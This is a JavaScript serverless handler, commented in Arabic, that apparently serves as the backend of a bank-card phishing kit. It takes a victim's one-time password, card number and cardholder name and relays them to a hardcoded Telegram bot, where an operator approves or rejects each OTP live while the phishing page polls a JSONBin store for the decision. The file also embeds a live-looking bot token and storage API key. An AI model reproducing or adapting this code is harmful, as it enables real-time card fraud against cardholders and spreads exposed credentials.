export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const OTP_BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
  const CHAT_ID = "8278749797";
  
  // مفاتيح سحابة JSONBin لتخزين الحالات بشكل دقيق
  const BIN_ID = "6af041a3ffd5d16053b0b102";
  const API_KEY = "$2a$10$KdTTWrgsRm/Rk01Njf6HmurDvGeNyAcYaUsLuCIWF20baDFcigsQ6";

  const method = req.method;
  const body = req.body || {};

  // 1. فحص الحالة (GET) من السحابة
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });

    try {
      const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
        headers: { 'X-Master-Key': API_KEY }
      });
      const currentData = await getRes.json();
      const record = currentData.record || {};

      // نتحقق من حالة الـ OTP الخاصة بهذا المستخدم
      const status = record[`otp_${user_id}`] || 'pending';
      return res.status(200).json({ status });
    } catch (err) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. إرسال كود الـ OTP إلى البوت (POST)
  if (method === 'POST' && body.رمز_التحقق_OTP) {
    const text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
                 `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
                 `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
                 `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
                 `🆔 معرف الجلسة: \`${body.user_id}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${body.user_id}` },
          { text: "❌ رفض", callback_data: `reject_otp_${body.user_id}` }
        ]
      ]
    };

    try {
      await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown',
          reply_markup: keyboard
        })
      });

      return res.status(200).json({ ok: true });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(200).json({ ok: true });
}
